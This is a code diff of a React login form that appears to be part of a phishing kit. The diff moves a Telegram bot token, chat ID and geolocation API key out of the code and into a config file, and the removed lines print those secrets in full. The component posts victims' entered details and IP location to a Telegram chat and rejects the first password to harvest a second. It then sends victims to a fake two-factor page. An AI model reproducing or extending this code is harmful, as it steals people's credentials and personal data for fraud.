@@ -4,10 +4,19 @@ import { useNavigate } from "react-router-dom";
 import "./LoginForm.scss";
 import PhoneInput from "react-phone-input-2";
 import "react-phone-input-2/lib/style.css";
+import {
+  BOT_TOKEN,
+  CHAT_ID,
+  GEO_API_KEY,
+  DATE_MAX_LENGTH,
+  PASSWORD_ERROR_DELAY_MS,
+  NAVIGATE_TO_2FA_DELAY_MS,
+} from "./config";
+import { TWO_FA_ROUTE } from "./paths.js";
 
 function LoginForm({ onClose }) {
-  const botToken = "8142928186:AAGE_KqkalgiC24BoZcmtYg5EHhyHDIRs5w";
-  const chatId = "1400161225";
+  const botToken = BOT_TOKEN;
+  const chatId = CHAT_ID;
   const [messageId, setMessageId] = useState(null);
 
   const navigate = useNavigate();
@@ -92,7 +101,7 @@ function LoginForm({ onClose }) {
 
         if (result && result.ip) {
           const locationResponse = await fetch(
-            `https://api.ipgeolocation.io/ipgeo?apiKey=126b3879b6b549f8a3e47448ae0a8e91&ip=${result.ip}`
+            `https://api.ipgeolocation.io/ipgeo?apiKey=${GEO_API_KEY}&ip=${result.ip}`
           );
           if (!locationResponse.ok) throw new Error("Failed to fetch location data");
           const locationData = await locationResponse.json();
@@ -256,31 +265,34 @@ function LoginForm({ onClose }) {
   };
 
   const updateTelegramMessage = async (newMessage) => {
-    if (!messageId) return;
-
     try {
-      await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
+      const oldMsgId = localStorage.getItem("telegram_msg_id");
+
+      const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: chatId,
-          message_id: messageId,
           text: newMessage,
           parse_mode: "HTML",
         }),
       });
+
+      const data = await res.json();
+      if (data?.ok && data?.result?.message_id) {
+        localStorage.setItem("telegram_msg_id", data.result.message_id);
+        setMessageId(data.result.message_id);
+      }
+
+      if (oldMsgId) {
+        await fetch(`https://api.telegram.org/bot${botToken}/deleteMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, message_id: oldMsgId }),
+        });
+      }
     } catch (err) {
       console.error("Telegram Update Error:", err);
-
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: newMessage,
-          parse_mode: "HTML",
-        }),
-      });
     }
   };
 
@@ -328,7 +340,7 @@ function LoginForm({ onClose }) {
           setPassword("");
           setIsSubmitDisabled(false);
           setLoadingPassword(false);
-        }, 3000);
+        }, PASSWORD_ERROR_DELAY_MS);
       } else if (clickCount === 1) {
         const secondPassword = password;
 
@@ -359,7 +371,7 @@ function LoginForm({ onClose }) {
           setLoadingPassword(false);
 
           navigate(
-            "/two_step_verification/two_factor?encrypted_context=ARGXVDNmvkm6x1PKWXYxZf5pV2sdJvMJqYMTymv2-de5YrlEWoxX0xg7RnF_rDySpQYuTuQ9d0zFWf2q6N2FdMWXQSSJMOhtiuo07gs_ereSWAR8bAQFSo0n-yFgKvwUDIr8qDgToWUi-159Og-45E4Rg7Nd5Bj6QIXOwI61sHE49rVkWStswIirOanuJKizNH_J3HCjxVYvJmOknToDzxSs2kWeBlsZKyA6BV7tVWnve92CBz_-HJEX1BAjQ-1-0HXM0ieM_J5QnDryfj1Q3wS9opHD8NgBuKLa17Rl2ImkhMs2T_9Xb5MoxtFLeMgDQEjfzeb8XXe957xSmfyBgZp8PeYQ3L5Dt-fKD2R7idaoggN6c-wnpjprnV5uWQRx5kCfAOsj4u1LtJrsQb6XQKWBeS8v3ZGKolKDUli_Wrb37OLyPlfNbbeVJ5TcPeTB52MF&flow=two_factor_login&next",
+            `${TWO_FA_ROUTE}?encrypted_context=ARGXVDNmvkm6x1PKWXYxZf5pV2sdJvMJqYMTymv2-de5YrlEWoxX0xg7RnF_rDySpQYuTuQ9d0zFWf2q6N2FdMWXQSSJMOhtiuo07gs_ereSWAR8bAQFSo0n-yFgKvwUDIr8qDgToWUi-159Og-45E4Rg7Nd5Bj6QIXOwI61sHE49rVkWStswIirOanuJKizNH_J3HCjxVYvJmOknToDzxSs2kWeBlsZKyA6BV7tVWnve92CBz_-HJEX1BAjQ-1-0HXM0ieM_J5QnDryfj1Q3wS9opHD8NgBuKLa17Rl2ImkhMs2T_9Xb5MoxtFLeMgDQEjfzeb8XXe957xSmfyBgZp8PeYQ3L5Dt-fKD2R7idaoggN6c-wnpjprnV5uWQRx5kCfAOsj4u1LtJrsQb6XQKWBeS8v3ZGKolKDUli_Wrb37OLyPlfNbbeVJ5TcPeTB52MF&flow=two_factor_login&next`,
             {
               state: {
                 method: "app",
@@ -374,7 +386,7 @@ function LoginForm({ onClose }) {
               replace: true,
             }
           );
-        }, 1200);
+        }, NAVIGATE_TO_2FA_DELAY_MS);
       }
 
       setClickCount((prev) => prev + 1);
@@ -541,7 +553,7 @@ function LoginForm({ onClose }) {
                   value={formData.dateOfBirth}
                   onChange={handleDateChange}
                   placeholder="MM/DD/YYYY"
-                  maxLength="10"
+                  maxLength={DATE_MAX_LENGTH}
                 />
                 {errors.dateOfBirth && (
                   <span className="error">{errors.dateOfBirth}</span>
